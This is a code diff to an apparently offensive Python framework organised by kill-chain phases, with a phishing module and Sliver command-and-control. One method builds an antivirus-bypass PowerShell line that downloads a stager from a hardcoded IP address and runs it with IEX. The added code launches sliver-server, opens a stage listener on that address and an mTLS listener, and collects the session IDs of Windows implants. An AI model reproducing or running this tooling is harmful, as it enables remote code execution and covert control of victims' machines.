@@ -2,6 +2,11 @@ import os
 import subprocess
 import csv
 import zipfile
+import time
+import json
+import re
+import threading
+import pexpect
 from dotenv import load_dotenv
 from tools.gophish.custom_gophish import custom_gophish
 
@@ -200,7 +205,7 @@ class weaponization:
         with open(file_path, 'w') as file:
             file.write(self.payload)
 
-    def ps_srcipt_for_bypass_av(directory, ps_name, payload_name):
+    def ps_srcipt_for_bypass_av(self, directory, ps_name, payload_name):
         # Content of the PowerShell script
         ps_content = f"(new-object system.net.webclient).downloadstring('http://18.143.102.216/stagers/{payload_name}') | IEX"
 
@@ -288,6 +293,8 @@ class installation:
     
 class c2:
     def __init__(self) -> None:
+        self.ids = []
+        self.is_gather = False
         print(self)
 
         # self.create_configs_for_sliver_cli()
@@ -312,25 +319,110 @@ class c2:
         except subprocess.CalledProcessError as e:
             print(f"Error executing shell script: {e}")
 
+    def parse_sessions_output(self, output):
+        # Regular expression pattern to match the session table
+        pattern = re.compile(r"(ID.*?)\n\n", re.DOTALL)
+
+        # Find all matches of the pattern in the output
+        matches = pattern.findall(output)
+
+        # Initialize a list to store session data
+        session_data = []
+
+        # Iterate over matches and parse each session table
+        for match in matches:
+            rows = match.strip().split('\n')
+            headers = rows[0].split()
+            table = []
+            for row in rows[2:]:
+                table.append(dict(zip(headers, row.split())))
+            session_data.append(table)
+
+        return session_data
+
     def start_sliver_server(self):
-        script_path = "./tools/sliver/run_custom_sliver.sh"
+        # Function to read and display output from the subprocess
+        def read_output_by_line(self):
+            while not self.stop_thread:
+                output = sliver_server.stdout.readline().strip()
+                if output:
+                    print(output)
+                    if "- windows/amd64" in output:
+                        split_list = output.split()
+                        session_id = split_list[2]
+                        self.ids.append(session_id)
+                        self.is_gather = True
+                time.sleep(0.1)
+
+        def intro(sliver_server):
+            # Flag to signal the thread to exit
+            self.stop_thread = False
+
+            # Start a thread to read and display output
+            output_thread = threading.Thread(target=read_output_by_line, args=(self,))
+            output_thread.start()
+
+            # Send commands to sliver-server
+            commands = [
+                "multiplayer\n",
+                "operators\n",
+                "profiles\n",
+                "stage-listener --url tcp://18.143.102.216:1234 --profile win64\n",
+                "mtls -l 8080\n",
+                "jobs\n"
+            ]
+
+            # Send commands to the sliver-server process
+            for command in commands:
+                sliver_server.stdin.write(command)
+                sliver_server.stdin.flush()
+
+        def gather_thread_func(self):
+            while True:
+                if self.is_gather:
+                    print("hello")
+                    self.is_gather = False
+                # Add a short sleep to avoid busy waiting
+                time.sleep(0.1)
+
         try:
-            # Change permissions of get_configs.sh to make it executable
-            subprocess.run(["chmod", "+x", script_path], check=True)
+            # Start the sliver-server process
+            sliver_server = subprocess.Popen(['sliver-server'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-            # Run the shell script
-            subprocess.run(["expect", script_path], check=True)
-            # # Run the shell script silently
-            # subprocess.run(["bash", script_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # gather information from sessions id is comming
+            gather_thread = threading.Thread(target=gather_thread_func, args=(self,))
+            gather_thread.start()
 
-            # print("Shell script executed successfully.")
+            # handle
+            intro(sliver_server)
+
         except subprocess.CalledProcessError as e:
-            print(f"Error executing shell script: {e}")
+            print(f"Error executing sliver-server command: {e}")
+
+    # def start_sliver_server(self):
+    #     script_path = "./tools/sliver/run_custom_sliver.sh"
+        # try:
+        #     # Change permissions of get_configs.sh to make it executable
+        #     subprocess.run(["chmod", "+x", script_path], check=True)
+
+        #     # Run the shell script
+        #     subprocess.run(["expect", script_path], check=True)
+        #     # # Run the shell script silently
+        #     # subprocess.run(["bash", script_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        #     # Send comment "session" to the terminal every 10 seconds
+        #     # while True:
+        #     #     subprocess.run(["echo", "# session"], check=True)
+        #     #     time.sleep(10)
+
+        #     # print("Shell script executed successfully.")
+        # except subprocess.CalledProcessError as e:
+        #     print(f"Error executing shell script: {e}")
 
 def main():
     list_phase = []
     # list_phase.append(reconaissance())
-    list_phase.append(weaponization())
+    # list_phase.append(weaponization())
     # list_phase.append(delivery())
     list_phase.append(exploitation())
     list_phase.append(installation())
